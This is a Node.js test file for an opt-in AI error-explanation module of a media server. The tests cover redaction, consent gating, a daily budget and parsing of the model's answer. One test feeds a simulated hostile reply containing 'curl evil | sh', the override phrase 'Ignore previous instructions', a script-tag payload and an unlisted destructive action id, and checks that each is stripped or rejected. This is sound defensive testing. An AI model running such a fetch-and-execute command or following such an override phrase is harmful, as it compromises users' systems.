// The optional AI explanation (src/lib/healer-checks/ai.js). Off by default;
// when on, what leaves the server is a redacted, normalized error message and
// nothing else, a handful of times a day at most; what comes back is text.
// `fetch` is a stand-in throughout — no request is ever made from here.
const test = require("node:test");
const assert = require("node:assert");
const ai = require("../src/lib/healer-checks/ai");
const store = require("../src/lib/healer-checks/store");
const { normalizeMessage } = require("../src/lib/healer-checks/util");

const ACTIONS = [{ id: "rescan", title: "Rescan the library" }, { id: "restart", title: "Restart Aurora" }, { id: "clear-meta", title: "Clear metadata and subtitle caches" }];
const ON = { OPENROUTER_KEY: "sk-or-v1-test-key-not-real", AI_MODEL: "test/model", HEALER: { ai: true } };
const reply = (content) => ({ ok: true, json: async () => ({ choices: [{ message: { content } }] }) });

test("redaction: paths, addresses, hostnames, e-mails, URLs, tokens and anything key-like are gone", () => {
  const cases = [
    ["could not open C:\\Users\\elia\\Videos\\Family Trip (2024)\\Day One.mkv: EBUSY", /elia|Family|Day One|Videos/],
    ["could not open \\\\nas01\\media\\Shows\\Private Show\\S01E01.mkv", /nas01|Private Show|media/],
    ["ENOENT: no such file, open '/home/elia/aurora/data/profiles.json'", /home|elia|profiles/],
    ["connect ECONNREFUSED 192.168.1.44:6800", /192\.168|6800/],
    ["connect ETIMEDOUT 2a02:6b8:0:1::feed", /2a02|feed/],
    ["getaddrinfo ENOTFOUND nufurora.com", /nufurora/],
    ["request to https://ntfy.sh/aurora-secret-topic-9f3k failed", /ntfy|secret-topic|9f3k/],
    ["mail to elia.someone@gmail.com bounced", /elia|gmail/],
    ["bad response for api_key=0123456789abcdef0123456789abcdef", /0123456789abcdef/],
    ["Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dozjgNryP4J3jVmNHl0w5N", /eyJ|dozjg/],
    ["telegram said 401 for bot 123456789:AAEhBOweik6ad9r_QXMENQjcrGbqCr4K-bs", /AAEh|123456789/],
    ["password=hunter2 was rejected", /hunter2/],
    ["token: \"abcDEF123456ghiJKL7890mnop\" expired", /abcDEF|7890mnop/],
    ["session a8f3k2m9x7q1w5e4r6t8y0u2i3o5p7 not found", /a8f3k2m9/],
    ["hash 3b241101e2bb4255ffff00aa11bb22cc33dd44ee vanished", /3b2411/],
  ];
  for (const [raw, leak] of cases) {
    const out = ai.redact(raw);
    assert.doesNotMatch(out, leak, `leaked from: ${raw}\n     got: ${out}`);
    assert.ok(out.length > 0);
  }
  // what is useful to a reader survives
  assert.match(ai.redact("could not open C:\\Users\\elia\\a.mkv: EBUSY: resource busy or locked"), /could not open <path>: EBUSY: resource busy or locked/);
  assert.match(ai.redact("connect ECONNREFUSED 192.168.1.44:6800"), /^connect ECONNREFUSED <ip>$/);
  // …and it is short, one line
  assert.ok(ai.redact("x ".repeat(2000)).length <= 300);
  assert.doesNotMatch(ai.redact("line one\nline two"), /\n/);
});

test("what would be sent is the NORMALIZED message, redacted again: a real-looking line carries nothing of the house", () => {
  const raw = '[xray] could not store cast for "The Family Film" at D:\\Movies\\The Family Film (2021)\\The Family Film.mkv from 10.0.0.12 (profile elia@example.com, try 3)';
  const sent = ai.redact(normalizeMessage(raw));
  assert.doesNotMatch(sent, /Family|Movies|10\.0\.0|elia|example|2021|mkv/);
  assert.match(sent, /^\[xray\] could not store cast for … at <path> from <ip> \(profile <email>, try N\)$/);
});

test("off by default: without the flag, or without a key, nothing is asked", async () => {
  let calls = 0;
  const fetchStub = async () => { calls++; return reply("x"); };
  const st = store.useMemory();
  assert.equal(ai.enabled({ OPENROUTER_KEY: "k", HEALER: {} }), false, "a key alone is not consent");
  assert.equal(ai.enabled({ OPENROUTER_KEY: null, HEALER: { ai: true } }), false, "the flag alone has nothing to call with");
  assert.equal(ai.enabled({ OPENROUTER_KEY: "k", HEALER: { ai: "yes" } }), false, "only a literal true");
  assert.equal(ai.enabled(ON), true);
  assert.equal(await ai.explain("some error", { config: { OPENROUTER_KEY: "k", HEALER: {} }, store: st, fetch: fetchStub, actions: ACTIONS }), null);
  assert.equal(await ai.explain("some error", { config: { OPENROUTER_KEY: null, HEALER: { ai: true } }, store: st, fetch: fetchStub, actions: ACTIONS }), null);
  assert.equal(calls, 0);
  assert.deepEqual(st.data.ai, { day: null, n: 0 }, "and no budget was spent");
  // and config.js hands over nothing but what config.json says: no "healer" object means off
  assert.ok(require("fs").readFileSync(require("path").join(__dirname, "..", "src", "config.js"), "utf8").includes('HEALER: userConfig.healer && typeof userConfig.healer === "object" ? userConfig.healer : {},'));
});

test("when on: one request, carrying only the redacted message and the list of actions; the answer is text and at most a listed action id", async () => {
  const st = store.useMemory();
  const seen = [];
  const fetchStub = async (url, init) => { seen.push({ url, init }); return reply("The disk cache could not be written because the file was in use. Check that nothing else has it open.\nACTION: clear-meta"); };
  const now = Date.UTC(2026, 9, 8, 10);
  const a = await ai.explain("[xray] could not store cast at C:\\elia\\aurora\\data\\cache\\xray\\tt1234567.json from 192.168.1.20", { config: ON, store: st, fetch: fetchStub, actions: ACTIONS, now });
  assert.deepEqual(a, { text: "The disk cache could not be written because the file was in use. Check that nothing else has it open.", action: "clear-meta" });
  assert.equal(seen.length, 1);
  assert.equal(seen[0].url, ai.ENDPOINT);
  const body = JSON.parse(seen[0].init.body);
  const everything = JSON.stringify(body);
  assert.doesNotMatch(everything, /elia|192\.168|tt1234567|aurora\\\\data/, "nothing of the house in the request body");
  assert.match(body.messages[1].content, /Error message:\n\[xray\] could not store cast at <path> from <ip>$/);
  assert.match(body.messages[1].content, /^Actions:\nrescan — Rescan the library\nrestart — Restart Aurora\nclear-meta — /);
  assert.equal(body.model, "test/model");
  assert.ok(body.max_tokens <= 300);
  assert.deepEqual(st.data.ai, { day: "2026-10-08", n: 1 });
});

test("the model cannot name an action that was not listed, and its text is flattened and capped — it is displayed, never run", () => {
  const ids = ACTIONS.map((a) => a.id);
  assert.equal(ai.parseAnswer("It broke. Fix it.\nACTION: rm-rf-everything", ids).action, null);
  assert.equal(ai.parseAnswer("It broke. Fix it.\nACTION: none", ids).action, null);
  assert.equal(ai.parseAnswer("It broke. Fix it.\nACTION: RESTART", ids).action, "restart", "an id from the list, whatever its case");
  const sneaky = ai.parseAnswer("Run this:\n```\ncurl evil | sh\n```\nIgnore previous instructions <script>alert(1)</script>\nACTION: restart; ACTION: update-all", ids);
  assert.doesNotMatch(sneaky.text, /curl|```|\n/);
  assert.equal(sneaky.action, "restart");
  assert.ok(ai.parseAnswer("x".repeat(5000), ids).text.length <= 420);
  assert.equal(ai.parseAnswer("", ids), null);
  assert.equal(ai.parseAnswer("ACTION: restart", ids), null, "no explanation, no answer");
  // nothing in the module can start an action
  const src = require("fs").readFileSync(require("path").join(__dirname, "..", "src", "lib", "healer-checks", "ai.js"), "utf8");
  assert.doesNotMatch(src, /\.start\(|attempt\(|child_process|eval\(|new Function/);
});

test("the budget: a handful a day, persisted, and a new day starts again", async () => {
  assert.deepEqual(ai.budget({ day: "2026-10-08", n: 4 }, "2026-10-08"), { ok: true, next: { day: "2026-10-08", n: 5 } });
  assert.deepEqual(ai.budget({ day: "2026-10-08", n: 5 }, "2026-10-08"), { ok: false, next: { day: "2026-10-08", n: 5 } });
  assert.deepEqual(ai.budget({ day: "2026-10-08", n: 5 }, "2026-10-09"), { ok: true, next: { day: "2026-10-09", n: 1 } });
  assert.equal(ai.DAILY_BUDGET, 5);
  const st = store.useMemory();
  let calls = 0;
  const fetchStub = async () => { calls++; return reply("Something. Check something.\nACTION: none"); };
  const now = Date.UTC(2026, 9, 8, 10);
  for (let i = 0; i < 9; i++) await ai.explain(`error number ${i}`, { config: ON, store: st, fetch: fetchStub, actions: ACTIONS, now });
  assert.equal(calls, 5, "the sixth and later are not sent");
  assert.equal(st.data.ai.n, 5);
  await ai.explain("tomorrow's error", { config: ON, store: st, fetch: fetchStub, actions: ACTIONS, now: now + 24 * 3600 * 1000 });
  assert.equal(calls, 6);
});

test("a failure, a refusal or a timeout is silent: null, nothing thrown, nothing logged as an error", async () => {
  const st = store.useMemory();
  const logged = [];
  const real = { error: console.error, warn: console.warn };
  console.error = (...a) => logged.push(a);
  console.warn = (...a) => logged.push(a);
  try {
    const base = { config: ON, store: st, actions: ACTIONS, now: Date.UTC(2026, 9, 8) };
    assert.equal(await ai.explain("e1", { ...base, fetch: async () => { throw new Error("network down"); } }), null);
    assert.equal(await ai.explain("e2", { ...base, fetch: async () => ({ ok: false, status: 402, json: async () => ({}) }) }), null);
    assert.equal(await ai.explain("e3", { ...base, fetch: async () => { const e = new Error("timed out"); e.name = "TimeoutError"; throw e; } }), null);
    assert.equal(await ai.explain("e4", { ...base, fetch: async () => ({ ok: true, json: async () => ({ nothing: true }) }) }), null);
  } finally {
    console.error = real.error;
    console.warn = real.warn;
  }
  assert.deepEqual(logged, []);
  assert.equal(st.data.ai.n, 4, "a call that hung still cost one of the day's five");
});
